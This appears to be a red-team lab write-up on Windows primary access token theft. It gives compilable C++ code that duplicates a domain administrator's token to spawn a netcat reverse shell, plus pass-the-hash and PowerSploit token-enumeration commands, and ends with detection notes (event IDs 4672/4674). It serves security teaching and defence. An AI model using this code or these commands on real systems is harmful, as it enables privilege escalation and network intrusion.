# Primary Access Token Manipulation

## Primary Access Token Manipulation

### Context

One of the techniques of token manipulation is creating a new process with a token "stolen" from another process. This is when a token of an already existing access token present in one of the running processes on the victim host, is retrieved, duplicated and then used for creating a new process, making the new process assume the privileges of that stolen token.

A high level process of the token stealing that will be carried out in this lab is as follows:

| Step                                                         | Win32 API                 |
| ------------------------------------------------------------ | ------------------------- |
| Open a process with access token you want to steal           | `OpenProcess`             |
| Get a handle to the access token of that process             | `OpenProcesToken`         |
| Make a duplicate of the access token present in that process | `DuplicateTokenEx`        |
| Create a new process with the newly aquired access token     | `CreateProcessWithTokenW` |

### Weaponization

Below is the C++ code implementing the above process. Note the variable `PID_TO_IMPERSONATE` that has a value of `3060` This is a process ID that we want to impersonate/steal the token from, since it is running as a domain admin and makes it for a good target:

![A victim cmd.exe process that is running under the context of DC admin offense\administrator](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJVShKfvgAl9GYyNMQZ%2F-LJVaxpgB6zDS1QZhQ4Y%2Ftokens-victim-3060.png?alt=media\&token=42b08fea-c8bd-4fb6-8407-39568817058f)

Note the line 16, which specifies the executable that should be launched with an impersonated token, which in our case effectively is a simple netcat reverse shell calling back to the attacking system:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJVi2A19kVmThuI90Ai%2F-LJVjLU3Ko9IQ7OMPTeB%2Ftokens-shell-c%2B%2B.png?alt=media\&token=8ec39270-7167-4486-9ddd-f70f9056214f)

This is the code if you want to compile and try it yourself:

{% code title="tokens.cpp" %}
```cpp
#include "stdafx.h"
#include <windows.h>
#include <iostream>

int main(int argc, char * argv[]) {
	char a;
	HANDLE processHandle;
	HANDLE tokenHandle = NULL;
	HANDLE duplicateTokenHandle = NULL;
	STARTUPINFO startupInfo;
	PROCESS_INFORMATION processInformation;
	DWORD PID_TO_IMPERSONATE = 3060;
	wchar_t cmdline[] = L"C:\\shell.cmd";
	ZeroMemory(&startupInfo, sizeof(STARTUPINFO));
	ZeroMemory(&processInformation, sizeof(PROCESS_INFORMATION));
	startupInfo.cb = sizeof(STARTUPINFO);	

	processHandle = OpenProcess(PROCESS_ALL_ACCESS, true, PID_TO_IMPERSONATE);
	OpenProcessToken(processHandle, TOKEN_ALL_ACCESS, &tokenHandle);
	DuplicateTokenEx(tokenHandle, TOKEN_ALL_ACCESS, NULL, SecurityImpersonation, TokenPrimary, &duplicateTokenHandle);			
	CreateProcessWithTokenW(duplicateTokenHandle, LOGON_WITH_PROFILE, NULL, cmdline, 0, NULL, NULL, &startupInfo, &processInformation);
	
	std::cin >> a;
    return 0;
}
```
{% endcode %}

### Execution

Launching `Tokens.exe` from the powershell console spawns a reverse shell that the attacker catches. Note how the `powershell.exe` - the parent process of `Tokens.exe` and `Tokens.exe` itself are running under `PC-Mantvydas\mantvydas`, but the newly spawned shell is running under `OFFENSE\Administrator` - this is because of the successful token theft:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJVShKfvgAl9GYyNMQZ%2F-LJVaxpcuUPyzehu-sUL%2Ftoken-shell-impersonated.png?alt=media\&token=61fc9342-d627-43e1-959a-ce8941bd870b)

The logon for OFFESNE\administrator in the above test was of logon type 2 (interactive logon, meaning I launched a new process on the victim system using a `runas /user:administrator@offense cmd` command).

Another quick test that I wanted to do was a theft of an access token that was present in the system due to a network logon (i.e psexec, winexec, pth-winexe, etc), so I spawned a cmd shell remotely from the attacking machine to the victim machine using:

{% code title="attacker\@local" %}
```
pth-winexe //10.0.0.2 -U offense/administrator%pass cmd
```
{% endcode %}

which created a new process on the victim system with a PID of 4780:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJYkO0ScpYWxL32prXO%2F-LJYlYAhJXf3F1oy_sCJ%2Ftokens-winexe.png?alt=media\&token=c2b2ebdb-82a1-46b3-8085-49d0cc73efa8)

Enumerating all the access tokens on the victim system with PowerSploit:

```csharp
Invoke-TokenManipulation -ShowAll | ft -Wrap -Property domain,username,tokentype,logontype,processid
```

...gives the below. Note the available token (highlighted) - it is the cmd.exe from above screenshot and its logon type is as expected - 3 - a network logon:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJYkO0ScpYWxL32prXO%2F-LJYlYAcpwFDBzwX_4EV%2Ftokens-all.png?alt=media\&token=dff34421-6c04-407a-a583-aa621a5ef4b2)

This token again can be stolen the same way we did it earlier. Let's change the PID in `Tokens.cpp` of the process we want to impersonate to `4780`:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJYkO0ScpYWxL32prXO%2F-LJYmwy2qJXBWxQO3ibX%2Ftokens-new-pid.png?alt=media\&token=5d167933-eba6-4bcb-a22b-5960dabd73f9)

Running the compiled code invokes a new process with the newly stolen token:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJYkO0ScpYWxL32prXO%2F-LJYn7S7ow-UgLfxrufR%2Ftokens-new-shell.png?alt=media\&token=2d75c4ff-2d91-4ffb-8141-53f66437d863)

note the cmd.exe has a PID 5188 - if we rerun the `Invoke-TokenManipulation`, we can see the new process is using the access token with logon type 3:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJYkO0ScpYWxL32prXO%2F-LJYnk7co2AjThgM5M_e%2Ftoken-new-logon-3.png?alt=media\&token=88d7ab0d-507a-4dc3-9010-5aab9f1fe2a4)

### Observations

Imagine you were investigating the host we stole the tokens from, because it exhibited some anomalous behaviour. In this particularly contrived example, since `Tokens.exe` was written to the disk on the victim system, you could have a quick look at its dissasembly and conclude it is attempting to manipulate access tokens - note that we can see the victim process PID and the CMDLINE arguments:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJZZP4vzaPLImznUSlH%2F-LJZZK-ySuCca-f0PPn1%2Ftoken-disasm.png?alt=media\&token=a805324d-071c-4ffa-aab6-63d30abbb8fc)

As suggested by the above, you should think about API monitoring if you want to detect these token manipulations on endpoints, but beware - this can be quite noisy.

Windows event logs of IDs `4672` and `4674` may be helpful for you as a defender also - below shows a network logon of a `pth-winexe //10.0.0.2 -U offense/administrator%pass cmd` and then later, a netcat reverse shell originating from the same logon session:

![](https://386337598-files.gitbook.io/~/files/v0/b/gitbook-legacy-files/o/assets%2F-LFEMnER3fywgFHoroYn%2F-LJZfJQDuI8x23ZabqVO%2F-LJZfGqnatUK5U4bDMOs%2Ftoken-logs.png?alt=media\&token=de231f1a-d245-4255-b3e1-d2b460052f63)

### References

{% embed url="https://www.blackhat.com/docs/eu-17/materials/eu-17-Atkinson-A-Process-Is-No-One-Hunting-For-Token-Manipulation.pdf" %}

{% embed url="https://attack.mitre.org/wiki/Technique/T1134" %}

{% embed url="https://digital-forensics.sans.org/blog/2012/03/21/protecting-privileged-domain-accounts-access-tokens" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/SecGloss/p-gly#-security-primary-token-gly" %}

{% embed url="https://technet.microsoft.com/pt-pt/library/cc783557(v=ws.10).aspx?f=255&MSPPError=-2147217396" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/secauthz/access-tokens" %}

{% embed url="https://clymb3r.wordpress.com/2013/11/03/powershell-and-token-impersonation/" %}

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446671(v=vs.85).aspx" %}

{% embed url="https://docs.microsoft.com/en-us/windows/desktop/api/winbase/nf-winbase-createprocesswithtokenw" %}

{% embed url="https://msdn.microsoft.com/en-us/library/windows/desktop/aa446617(v=vs.85).aspx" %}

{% embed url="https://youtu.be/Ed_2BKn3QR8" %}
